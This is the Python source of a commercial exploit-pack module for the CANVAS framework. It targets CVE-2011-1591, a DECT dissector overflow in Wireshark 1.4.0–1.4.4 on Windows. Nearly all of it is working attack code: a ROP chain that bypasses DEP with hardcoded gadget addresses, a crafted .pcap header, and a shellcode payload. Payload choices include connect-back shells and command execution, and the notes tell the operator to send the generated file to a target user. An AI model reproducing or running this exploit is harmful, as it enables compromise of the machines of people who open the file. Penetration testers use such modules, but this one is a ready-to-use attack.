
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "Wireshark v1.4.0-1.4.4 DECT Dissector .pcap Clientside Overflow"
DESCRIPTION = "A file format clientside overflow in Wireshark v1.4.0-1.4.4"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Wireshark'
DOCUMENTATION["Date public"] = "2011-04-17"
DOCUMENTATION["References"] = "https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5836"
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "CVE-2011-1591"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2011-1591'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "7", "Vista"]

NOTES="""
This is a client-side exploit - so run the module and send the created file
to the target user

WP> White Phosphorus Exploit Pack
WP> Wireshark DECT Dissector .pcap Clientside Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)

Versions:
0: Windows Universal DEP (Wireshark v1.4.0-1.4.4)

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_wireshark_dect_pcap/wp_wireshark_dect_pcap.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal DEP (Wireshark v1.4.0-1.4.4)", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ######################################################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x09\x20"
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".pcap"
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return
    
    def buildDEPBypass(self, size = 2200):
        self.log("WP> Generating Universal DEP Bypass")
        size += 32  # bytes to shellcode after pushad esp ptr
        
        depBypass = pack('<L', 0x619D6BF6) # pop ecx; pop ebx; pop ebp
        depBypass += pack('<L', 0x619DDB84) # rw
        depBypass += pack('<L', 0x70C92184) # VP
        depBypass += pack('<L', 0x66790953) # call ebx; add esp, 14; pop; pop;
        depBypass += pack('<L', 0x68647FC5) # pop eax
        depBypass += pack('<L', 0xFFFFFFC0)
        depBypass += pack('<L', 0x685C2E70) # neg eax
        depBypass += pack('<L', 0x61BC1D59) # xchg edx, eax
        depBypass += pack('<L', 0x68647FC5) # pop eax
        
        while hasbadchar((pack("<i", -size)), self.badstring):
            size += 1
        
        depBypass += pack("<i", -size)
        depBypass += pack('<L', 0x685C2E70) # neg eax
        depBypass += pack('<L', 0x617F4391) # xchg eax, ebx
        depBypass += pack('<L', 0x68647589) # pop esi
        depBypass += pack('<L', 0x617F4391) # xchg eax, ebx
        depBypass += pack('<L', 0x68647F74) # pop edi
        depBypass += pack('<L', 0x6D5A6777) # mov eax, [eax]
        depBypass += pack('<L', 0x6D58BFAE) # pushad
        depBypass += wp_randomstring(24)    # padding
        depBypass += pack('<L', 0x6D5961E8) # push esp
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal Bypass Size: %d bytes"%self.depBypass_size)
        return depBypass

    def makefile(self):
        filedata = (
            "\xD4\xC3\xB2\xA1\x02\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            "\xFF\x7F\x00\x00\x01\x00\x00\x00\xD5\x3D\xAE\x4D\xD0\xFB\x01\x00"
            "\x0E\x20\x00\x00\x0E\x20\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"
            "\x00\x00\x00\x00\x23\x23")
        filedata += wp_randomstring(1071)
        filedata += pack('<L', 0x68E49070) # add esp, A4
        filedata += wp_randomstring(20)
        filedata += pack('<L', 0x686207FA) # add esp, 90
        filedata += wp_randomstring(4)
        filedata += pack('<L', 0x686207FA) # add esp, 90
        filedata += wp_randomstring(136)
        filedata += pack('<L', 0x667836D0) # add esp, 834
        filedata += wp_randomstring(8)
        filedata += pack('<L', 0x667836D8)*3 # ret
        filedata += self.buildDEPBypass(len(self.shellcode))
        filedata += self.shellcode
        filedata += wp_randomstring(((8192 + 54) - len(filedata)))
        return filedata

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
